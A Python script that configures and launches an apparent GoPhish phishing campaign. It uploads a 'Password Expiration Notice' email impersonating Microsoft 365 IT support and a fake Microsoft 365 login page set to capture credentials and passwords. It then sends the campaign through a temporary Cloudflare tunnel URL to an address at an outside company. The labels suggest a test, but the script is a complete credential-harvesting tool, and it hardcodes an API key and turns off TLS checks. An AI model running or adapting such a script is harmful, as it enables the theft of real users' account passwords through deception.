import json
import ssl
import urllib.request

API_KEY = "38154aafd6867378cb200f31661aa4ed524bb64aa8d91f6d1ad0d61fb8f695fa"
BASE = "https://localhost:3333/api"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def api(method, path, data=None):
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(
        f"{BASE}/{path}",
        data=body,
        method=method,
        headers={
            "Authorization": f"Bearer {API_KEY}",
            "Content-Type": "application/json",
        },
    )
    with urllib.request.urlopen(req, context=ctx) as resp:
        return json.loads(resp.read())


# 1. Update email template
print("Updating email template...")
with open("templates/email-template.html", "r", encoding="utf-8") as f:
    email_html = f.read()

api(
    "PUT",
    "templates/1",
    {
        "id": 1,
        "name": "Password Expiration Notice",
        "subject": "Action Required: Your password expires in 3 business days",
        "html": email_html,
        "text": "Hi {{.FirstName}},\n\nYour Microsoft 365 password expires in 3 business days. Reset it now: {{.URL}}\n\nThanks,\nIT Support Team",
        "envelope_sender": "",
    },
)
print("  Done.")

# 2. Update landing page
print("Updating landing page...")
with open("templates/landing-page.html", "r", encoding="utf-8") as f:
    landing_html = f.read()

api(
    "PUT",
    "pages/1",
    {
        "id": 1,
        "name": "Microsoft 365 Login",
        "html": landing_html,
        "capture_credentials": True,
        "capture_passwords": True,
        "redirect_url": "https://login.microsoftonline.com",
    },
)
print("  Done.")

# 3. Verify
t = api("GET", "templates/1")
p = api("GET", "pages/1")
print(
    f"\nVerify: email HTML={len(t['html'])} chars, landing HTML={len(p['html'])} chars"
)

# 4. Send campaign
print("\nLaunching campaign...")
from datetime import datetime

result = api(
    "POST",
    "campaigns/",
    {
        "name": f"Peter Test - {datetime.now().strftime('%m%d-%H%M')}",
        "template": {"name": "Password Expiration Notice"},
        "page": {"name": "Microsoft 365 Login"},
        "smtp": {"name": "Blanco IT Services"},
        "url": "https://mazda-savings-advisory-glasses.trycloudflare.com",
        "groups": [{"name": "IT Dept Test Group"}],
    },
)
print(f"Campaign ID: {result['id']} - Status: {result['status']}")
print("From: itsupport@blancoitservices.net -> pblanco@equippers.com")
